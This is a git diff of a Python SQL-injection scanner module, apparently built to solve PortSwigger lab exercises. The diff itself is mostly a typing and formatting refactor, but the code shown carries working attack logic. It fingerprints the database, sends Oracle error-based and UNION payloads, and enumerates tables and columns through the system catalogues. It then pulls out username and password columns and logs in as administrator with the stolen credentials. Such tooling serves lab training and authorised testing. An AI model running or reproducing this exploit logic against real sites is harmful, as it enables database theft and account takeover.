@@ -26,7 +26,6 @@ from __future__ import annotations
 import re
 import time
 from dataclasses import dataclass, field
-from typing import List, Optional, Dict
 
 from app.modules.scanner.core.base_scanner import BaseScanner
 from app.modules.scanner.core.request_engine import ResponseData
@@ -47,10 +46,10 @@ class UnionFinding:
     technique: str = "UNION-Based"
     dbms: str = ""
     column_count: int = 0
-    visible_columns: List[int] = field(default_factory=list)
-    extracted_data: List[Dict[str, str]] = field(default_factory=list)
+    visible_columns: list[int] = field(default_factory=list)
+    extracted_data: list[dict[str, str]] = field(default_factory=list)
     confidence: float = 0.0
-    evidence: List[str] = field(default_factory=list)
+    evidence: list[str] = field(default_factory=list)
 
 
 # ============================================================
@@ -70,13 +69,13 @@ class UnionSQLiScanner(BaseScanner):
 
     def __init__(self, target: str):
         super().__init__(target)
-        self.findings: List[UnionFinding] = []
-        self.detected_dbms: Optional[str] = None
+        self.findings: list[UnionFinding] = []
+        self.detected_dbms: str | None = None
         self.parameter: str = "category"
 
         # Scanner state attributes
         self.column_count: int = 0
-        self.visible_columns: List[int] = []
+        self.visible_columns: list[int] = []
         self.version_extracted: bool = False
         self.response_analysis_success: bool = False
 
@@ -89,13 +88,13 @@ class UnionSQLiScanner(BaseScanner):
         }
 
         # Runtime tracking
-        self.started_at: Optional[float] = None
-        self.finished_at: Optional[float] = None
+        self.started_at: float | None = None
+        self.finished_at: float | None = None
 
     # ============================================================
     # Main Scan
     # ============================================================
-    def scan(self) -> List[UnionFinding]:
+    def scan(self) -> list[UnionFinding]:
         """Execute UNION-based SQL injection scan."""
         self.findings.clear()
         self.started_at = self._now()
@@ -202,9 +201,7 @@ class UnionSQLiScanner(BaseScanner):
                         f"✅ Oracle enumeration complete: {len(credentials)} credentials extracted"
                     )
                 else:
-                    self._log(
-                        "⚠️ Oracle enumeration completed but no credentials found"
-                    )
+                    self._log("⚠️ Oracle enumeration completed but no credentials found")
             except ImportError as e:
                 self._log(f"⚠️ Oracle enum module not available: {e}")
 
@@ -325,11 +322,11 @@ class UnionSQLiScanner(BaseScanner):
             body = response.body.lower()
             if "oracle" in body or "ora-" in body:
                 scores["Oracle"] += 20
-                self._log(f"  🔍 Oracle: v$version signature found (+20)")
+                self._log("  🔍 Oracle: v$version signature found (+20)")
             elif "error" not in body and "syntax" not in body:
                 # Oracle v$version returned no error, strong signal
                 scores["Oracle"] += 15
-                self._log(f"  🔍 Oracle: v$version returned valid response (+15)")
+                self._log("  🔍 Oracle: v$version returned valid response (+15)")
 
         # ============================================================
         # Test 2: Oracle (FROM dual)
@@ -340,12 +337,12 @@ class UnionSQLiScanner(BaseScanner):
             body = response.body.lower()
             if "error" not in body and "syntax" not in body:
                 scores["Oracle"] += 10
-                self._log(f"  🔍 Oracle: FROM dual works (+10)")
+                self._log("  🔍 Oracle: FROM dual works (+10)")
             else:
                 # If error but contains Oracle error signatures
                 if "ora-" in body or "oracle" in body:
                     scores["Oracle"] += 5
-                    self._log(f"  🔍 Oracle: error signature found (+5)")
+                    self._log("  🔍 Oracle: error signature found (+5)")
 
         # ============================================================
         # Test 3: MySQL (@@version with # comment) - LOWER PRIORITY
@@ -356,11 +353,11 @@ class UnionSQLiScanner(BaseScanner):
             body = response.body.lower()
             if "mysql" in body or "mariadb" in body:
                 scores["MySQL"] += 5
-                self._log(f"  🔍 MySQL: @@version# returned MySQL signature (+5)")
+                self._log("  🔍 MySQL: @@version# returned MySQL signature (+5)")
             else:
                 # MySQL version returned but no signature - low confidence
                 scores["MySQL"] += 2
-                self._log(f"  🔍 MySQL: @@version# returned valid response (+2)")
+                self._log("  🔍 MySQL: @@version# returned valid response (+2)")
 
         # ============================================================
         # Test 4: MySQL (version function)
@@ -371,10 +368,10 @@ class UnionSQLiScanner(BaseScanner):
             body = response.body.lower()
             if "mysql" in body or "mariadb" in body:
                 scores["MySQL"] += 5
-                self._log(f"  🔍 MySQL: version() returned MySQL signature (+5)")
+                self._log("  🔍 MySQL: version() returned MySQL signature (+5)")
             else:
                 scores["MySQL"] += 2
-                self._log(f"  🔍 MySQL: version() returned valid response (+2)")
+                self._log("  🔍 MySQL: version() returned valid response (+2)")
 
         # ============================================================
         # Test 5: PostgreSQL (version function)
@@ -386,7 +383,7 @@ class UnionSQLiScanner(BaseScanner):
             if "postgresql" in body or "postgres" in body:
                 scores["PostgreSQL"] += 15
                 self._log(
-                    f"  🔍 PostgreSQL: version() returned PostgreSQL signature (+15)"
+                    "  🔍 PostgreSQL: version() returned PostgreSQL signature (+15)"
                 )
 
         # ============================================================
@@ -398,7 +395,7 @@ class UnionSQLiScanner(BaseScanner):
             body = response.body.lower()
             if "microsoft" in body or "sql server" in body:
                 scores["MSSQL"] += 15
-                self._log(f"  🔍 MSSQL: @@version returned MSSQL signature (+15)")
+                self._log("  🔍 MSSQL: @@version returned MSSQL signature (+15)")
 
         # ============================================================
         # Test 7: MySQL (CONCAT function)
@@ -411,7 +408,7 @@ class UnionSQLiScanner(BaseScanner):
                 # Could be MySQL or PostgreSQL, check if already scored
                 if scores.get("MySQL", 0) == 0 and scores.get("PostgreSQL", 0) == 0:
                     scores["MySQL"] += 3
-                    self._log(f"  🔍 MySQL: CONCAT('test') returned test (+3)")
+                    self._log("  🔍 MySQL: CONCAT('test') returned test (+3)")
 
         # ============================================================
         # Test 8: PortSwigger Lab detection from title
@@ -421,23 +418,23 @@ class UnionSQLiScanner(BaseScanner):
             response = self._send_request("")
             if response and hasattr(response, "body"):
                 body = response.body
-                title_match = re.search(r"<title>(.*?)</title>", body, re.I)
+                title_match = re.search(r"<title>(.*?)</title>", body, re.IGNORECASE)
                 if title_match:
                     title = title_match.group(1).lower()
                     self._log(f"  🔍 Page title: {title_match.group(1)}")
                     if "oracle" in title:
                         scores["Oracle"] += 10
-                        self._log(f"  🔍 Oracle: title contains 'Oracle' (+10)")
+                        self._log("  🔍 Oracle: title contains 'Oracle' (+10)")
                     if "mysql" in title or "mariadb" in title:
                         scores["MySQL"] += 10
-                        self._log(f"  🔍 MySQL: title contains 'MySQL' (+10)")
+                        self._log("  🔍 MySQL: title contains 'MySQL' (+10)")
                     if "postgresql" in title or "postgres" in title:
                         scores["PostgreSQL"] += 10
-                        self._log(f"  🔍 PostgreSQL: title contains 'PostgreSQL' (+10)")
+                        self._log("  🔍 PostgreSQL: title contains 'PostgreSQL' (+10)")
                     if "microsoft" in title or "sql server" in title:
                         scores["MSSQL"] += 10
                         self._log(
-                            f"  🔍 MSSQL: title contains 'Microsoft' or 'SQL Server' (+10)"
+                            "  🔍 MSSQL: title contains 'Microsoft' or 'SQL Server' (+10)"
                         )
         except Exception as e:
             self._log(f"  ⚠️ Could not fetch page title: {e}")
@@ -474,7 +471,7 @@ class UnionSQLiScanner(BaseScanner):
         self.detection_confidence = 0.2
         return "MySQL"
 
-    def _detect_dbms_from_errors(self) -> Optional[str]:
+    def _detect_dbms_from_errors(self) -> str | None:
         """
         Fallback: Detect DBMS from error messages.
         """
@@ -483,16 +480,16 @@ class UnionSQLiScanner(BaseScanner):
         if response:
             body = response.body.lower()
             if "oracle" in body or "ora-" in body:
-                self._log(f"  🔍 Error-based detection: Oracle")
+                self._log("  🔍 Error-based detection: Oracle")
                 return "Oracle"
             if "mysql" in body or "mariadb" in body:
-                self._log(f"  🔍 Error-based detection: MySQL")
+                self._log("  🔍 Error-based detection: MySQL")
                 return "MySQL"
             if "postgresql" in body:
-                self._log(f"  🔍 Error-based detection: PostgreSQL")
+                self._log("  🔍 Error-based detection: PostgreSQL")
                 return "PostgreSQL"
             if "microsoft" in body or "sql server" in body:
-                self._log(f"  🔍 Error-based detection: MSSQL")
+                self._log("  🔍 Error-based detection: MSSQL")
                 return "MSSQL"
         return None
 
@@ -543,7 +540,7 @@ class UnionSQLiScanner(BaseScanner):
     # ============================================================
     # Visible Column Detection
     # ============================================================
-    def _detect_visible_columns(self, column_count: int) -> List[int]:
+    def _detect_visible_columns(self, column_count: int) -> list[int]:
         """
         Detect which columns are visible in the response.
         For Oracle, uses error-based detection when normal reflection fails.
@@ -598,8 +595,8 @@ class UnionSQLiScanner(BaseScanner):
             if self.detected_dbms == "Oracle":
                 # Try to cause an error that reveals the column
                 error_payloads = [
-                    f"' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT NULL FROM dual WHERE ROWNUM=1)))--",
-                    f"' AND 1=TO_NUMBER((SELECT NULL FROM dual))--",
+                    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT NULL FROM dual WHERE ROWNUM=1)))--",
+                    "' AND 1=TO_NUMBER((SELECT NULL FROM dual))--",
                 ]
                 for err_payload in error_payloads:
                     err_response = self._send_request(err_payload)
@@ -616,8 +613,8 @@ class UnionSQLiScanner(BaseScanner):
     # ============================================================
 
     def _extract_version(
-        self, column_count: int, visible_columns: List[int]
-    ) -> List[Dict[str, str]]:
+        self, column_count: int, visible_columns: list[int]
+    ) -> list[dict[str, str]]:
         """Extract database version based on detected DBMS."""
         if self.detected_dbms == "Oracle":
             return self._extract_oracle_version(column_count, visible_columns)
@@ -630,8 +627,8 @@ class UnionSQLiScanner(BaseScanner):
         return []
 
     def _extract_oracle_version(
-        self, column_count: int, visible_columns: List[int]
-    ) -> List[Dict[str, str]]:
+        self, column_count: int, visible_columns: list[int]
+    ) -> list[dict[str, str]]:
         """Extract Oracle version."""
         col_list = ["NULL"] * column_count
         for idx in visible_columns:
@@ -644,7 +641,7 @@ class UnionSQLiScanner(BaseScanner):
             return []
 
         body = response.body
-        pattern = re.compile(r"(Oracle Database[^\n<]+)", re.I)
+        pattern = re.compile(r"(Oracle Database[^\n<]+)", re.IGNORECASE)
         matches = pattern.findall(body)
 
         if matches:
@@ -652,8 +649,8 @@ class UnionSQLiScanner(BaseScanner):
         return []
 
     def _extract_mysql_version(
-        self, column_count: int, visible_columns: List[int]
-    ) -> List[Dict[str, str]]:
+        self, column_count: int, visible_columns: list[int]
+    ) -> list[dict[str, str]]:
         """Extract MySQL version."""
         col_list = ["NULL"] * column_count
         for idx in visible_columns:
@@ -666,7 +663,7 @@ class UnionSQLiScanner(BaseScanner):
             return []
 
         body = response.body
-        pattern = re.compile(r"(\d+\.\d+\.\d+[^\s<]*)", re.I)
+        pattern = re.compile(r"(\d+\.\d+\.\d+[^\s<]*)", re.IGNORECASE)
         matches = pattern.findall(body)
 
         if matches:
@@ -674,7 +671,7 @@ class UnionSQLiScanner(BaseScanner):
             return [{"dbms": "MySQL", "version": best}]
         return []
 
-    def _extract_oracle_data(self, column_count: int) -> List[Dict[str, str]]:
+    def _extract_oracle_data(self, column_count: int) -> list[dict[str, str]]:
         """
         Extract data from Oracle using error-based or union-based techniques.
         """
@@ -703,8 +700,8 @@ class UnionSQLiScanner(BaseScanner):
         return data
 
     def _extract_oracle_union_data(
-        self, column_count: int, visible_columns: List[int]
-    ) -> List[Dict[str, str]]:
+        self, column_count: int, visible_columns: list[int]
+    ) -> list[dict[str, str]]:
         """
         Extract data from Oracle using UNION-based technique.
         """
@@ -811,8 +808,8 @@ class UnionSQLiScanner(BaseScanner):
         return data
 
     def _extract_postgresql_version(
-        self, column_count: int, visible_columns: List[int]
-    ) -> List[Dict[str, str]]:
+        self, column_count: int, visible_columns: list[int]
+    ) -> list[dict[str, str]]:
         """Extract PostgreSQL version."""
         col_list = ["NULL"] * column_count
         for idx in visible_columns:
@@ -825,7 +822,7 @@ class UnionSQLiScanner(BaseScanner):
             return []
 
         body = response.body
-        pattern = re.compile(r"(PostgreSQL[^\n<]+)", re.I)
+        pattern = re.compile(r"(PostgreSQL[^\n<]+)", re.IGNORECASE)
         matches = pattern.findall(body)
 
         if matches:
@@ -836,8 +833,8 @@ class UnionSQLiScanner(BaseScanner):
     # Table Enumeration
     # ============================================================
     def _enumerate_tables(
-        self, column_count: int, visible_columns: List[int]
-    ) -> List[Dict[str, str]]:
+        self, column_count: int, visible_columns: list[int]
+    ) -> list[dict[str, str]]:
         """
         Enumerate tables in the database.
         Supports Oracle (user_tables/all_tables), MySQL, PostgreSQL, MSSQL.
@@ -860,7 +857,7 @@ class UnionSQLiScanner(BaseScanner):
                         col_list[idx] = "table_name"
 
                 # Oracle query with ROWNUM and NOT IN for pagination
-                for i in range(0, 100):
+                for i in range(100):
                     # Use NOT IN to get unique tables
                     payload = f"' UNION SELECT {', '.join(col_list)} FROM {table_source} WHERE ROWNUM=1 AND table_name NOT IN (SELECT table_name FROM {table_source} WHERE ROWNUM<={i})--"
                     self._log(f"  📤 Oracle table payload: {payload[:80]}...")
@@ -868,7 +865,7 @@ class UnionSQLiScanner(BaseScanner):
                     response = self._send_request(payload)
 
                     if response is None:
-                        self._log(f"  ❌ No response for table {i+1}")
+                        self._log(f"  ❌ No response for table {i + 1}")
                         break
 
                     body = response.body
@@ -884,7 +881,7 @@ class UnionSQLiScanner(BaseScanner):
 
                     table_found = None
                     for pattern in table_patterns:
-                        matches = re.findall(pattern, body, re.I)
+                        matches = re.findall(pattern, body, re.IGNORECASE)
                         for match in matches:
                             # Filter out noise
                             if (
@@ -910,10 +907,10 @@ class UnionSQLiScanner(BaseScanner):
 
                     if table_found:
                         tables.append({"table": table_found})
-                        self._log(f"  ✅ Table {i+1}: {table_found}")
+                        self._log(f"  ✅ Table {i + 1}: {table_found}")
                     else:
                         # If no table found, stop enumerating
-                        self._log(f"  ℹ️ No more tables found (stopped at {i+1})")
+                        self._log(f"  ℹ️ No more tables found (stopped at {i + 1})")
                         break
 
                 if tables:
@@ -1003,8 +1000,8 @@ class UnionSQLiScanner(BaseScanner):
     # Column Enumeration
     # ============================================================
     def _enumerate_columns(
-        self, column_count: int, visible_columns: List[int], table: str
-    ) -> List[str]:
+        self, column_count: int, visible_columns: list[int], table: str
+    ) -> list[str]:
         """
         Enumerate columns for a specific table.
         Supports Oracle (all_tab_columns), MySQL, PostgreSQL, MSSQL.
@@ -1027,7 +1024,7 @@ class UnionSQLiScanner(BaseScanner):
             column_sources = ["all_tab_columns", "user_tab_columns"]
 
             for col_source in column_sources:
-                for i in range(0, 50):
+                for i in range(50):
                     payload = f"' UNION SELECT {', '.join(col_list)} FROM {col_source} WHERE table_name='{table}' AND ROWNUM=1 AND column_name NOT IN (SELECT column_name FROM {col_source} WHERE table_name='{table}' AND ROWNUM<={i})--"
                     self._log(f"  📤 Oracle column payload: {payload[:80]}...")
 
@@ -1048,7 +1045,7 @@ class UnionSQLiScanner(BaseScanner):
 
                     column_found = None
                     for pattern in column_patterns:
-                        matches = re.findall(pattern, body, re.I)
+                        matches = re.findall(pattern, body, re.IGNORECASE)
                         for match in matches:
                             if (
                                 match.upper()
@@ -1071,7 +1068,7 @@ class UnionSQLiScanner(BaseScanner):
 
                     if column_found:
                         columns.append(column_found)
-                        self._log(f"  ✅ Column {i+1}: {column_found}")
+                        self._log(f"  ✅ Column {i + 1}: {column_found}")
                     else:
                         break
 
@@ -1079,9 +1076,7 @@ class UnionSQLiScanner(BaseScanner):
                     self._log(f"  ✅ Found {len(columns)} columns from {col_source}")
                     break
                 else:
-                    self._log(
-                        f"  ⚠️ No columns found from {col_source}, trying next..."
-                    )
+                    self._log(f"  ⚠️ No columns found from {col_source}, trying next...")
 
         # ============================================================
         # MySQL/PostgreSQL: information_schema.columns
@@ -1152,9 +1147,7 @@ class UnionSQLiScanner(BaseScanner):
                 or "name" in col_lower
                 or "login" in col_lower
                 or "email" in col_lower
-            ):
-                priority_columns.append(col)
-            elif (
+            ) or (
                 "pass" in col_lower
                 or "pwd" in col_lower
                 or "cred" in col_lower
@@ -1172,10 +1165,10 @@ class UnionSQLiScanner(BaseScanner):
     def _extract_credentials(
         self,
         column_count: int,
-        visible_columns: List[int],
+        visible_columns: list[int],
         table: str,
-        columns: List[str],
-    ) -> List[Dict[str, str]]:
+        columns: list[str],
+    ) -> list[dict[str, str]]:
         """
         Extract credentials from user table.
         Properly identifies username and password columns.
@@ -1246,7 +1239,7 @@ class UnionSQLiScanner(BaseScanner):
                     break
 
         if not username_col or not password_col:
-            print(f"[UnionSQLi]   ❌ Could not find username/password columns")
+            print("[UnionSQLi]   ❌ Could not find username/password columns")
             return []
 
         # ============================================================
@@ -1270,7 +1263,7 @@ class UnionSQLiScanner(BaseScanner):
         # ============================================================
         # Debug: Print response preview
         # ============================================================
-        print(f"[UnionSQLi]   📥 Response preview (first 300 chars):")
+        print("[UnionSQLi]   📥 Response preview (first 300 chars):")
         print(f"{response.body[:300]}")  # <--- FIXED: text → body
 
         # ============================================================
@@ -1286,7 +1279,7 @@ class UnionSQLiScanner(BaseScanner):
         # Reject if response contains error messages
         # ============================================================
         if "internal server error" in body.lower() or "server error" in body.lower():
-            print(f"[UnionSQLi]   ❌ Server error detected")
+            print("[UnionSQLi]   ❌ Server error detected")
             return []
 
         # ============================================================
@@ -1314,7 +1307,8 @@ class UnionSQLiScanner(BaseScanner):
         # Try HTML table extraction
         if not credentials:
             table_pattern = re.compile(
-                r"<td[^>]*>([^<]+)</td>\s*<td[^>]*>([^<]+)</td>", re.DOTALL | re.I
+                r"<td[^>]*>([^<]+)</td>\s*<td[^>]*>([^<]+)</td>",
+                re.DOTALL | re.IGNORECASE,
             )
             matches = table_pattern.findall(body)
             for match in matches:
@@ -1333,7 +1327,7 @@ class UnionSQLiScanner(BaseScanner):
     # Helpers
     # ============================================================
 
-    def _find_user_table(self, tables: List[Dict[str, str]]) -> Optional[str]:
+    def _find_user_table(self, tables: list[dict[str, str]]) -> str | None:
         """Find user table from enumerated tables."""
         for t in tables:
             name = t.get("table", "")
@@ -1458,7 +1452,6 @@ class UnionSQLiScanner(BaseScanner):
             "Layer_1",
             "back",
             "arrow",
-            "solved",
             "notsolved",
             "widgetcontainer",
             "academyLabHeader",
@@ -1475,19 +1468,8 @@ class UnionSQLiScanner(BaseScanner):
             "category",
             "Refine",
             "your",
-            "Gifts",
-            "Pets",
-            "Food",
-            "Drink",
-            "Lifestyle",
-            "Corporate",
             "gifts",
             "and",
-            "shoes",
-            "accessories",
-            "All",
-            "Accessories",
-            "Clothing",
         }
 
         if username.lower() in [n.lower() for n in noise_keywords]:
@@ -1515,7 +1497,7 @@ class UnionSQLiScanner(BaseScanner):
 
         return True
 
-    def _get_html_noise_list(self) -> List[str]:
+    def _get_html_noise_list(self) -> list[str]:
         """Return list of HTML noise keywords."""
         return [
             "DOCTYPE",
@@ -1634,9 +1616,9 @@ class UnionSQLiScanner(BaseScanner):
     def _build_credential_payload(
         self,
         column_count: int,
-        visible_columns: List[int],
+        visible_columns: list[int],
         table: str,
-        columns: List[str],
+        columns: list[str],
     ) -> str:
         """Build credential extraction payload."""
         username_col = None
@@ -1663,7 +1645,7 @@ class UnionSQLiScanner(BaseScanner):
         return ""
 
     def _build_union_payload(
-        self, column_count: int, visible_columns: List[int]
+        self, column_count: int, visible_columns: list[int]
     ) -> str:
         """
         Build the appropriate UNION payload based on detected DBMS.
@@ -1730,7 +1712,7 @@ class UnionSQLiScanner(BaseScanner):
 
         return min(confidence, 1.0)
 
-    def _login_as_administrator(self, credentials: List[Dict[str, str]]) -> bool:
+    def _login_as_administrator(self, credentials: list[dict[str, str]]) -> bool:
         """
         Attempt to log in as administrator using extracted credentials.
 
@@ -1810,7 +1792,7 @@ class UnionSQLiScanner(BaseScanner):
             self._log(f"  ❌ Login error: {e}")
             return False
 
-    def _send_request(self, payload: str = "") -> Optional[ResponseData]:
+    def _send_request(self, payload: str = "") -> ResponseData | None:
         """Send request with payload."""
         self.statistics["requests"] += 1
         self.statistics["payloads"] += 1
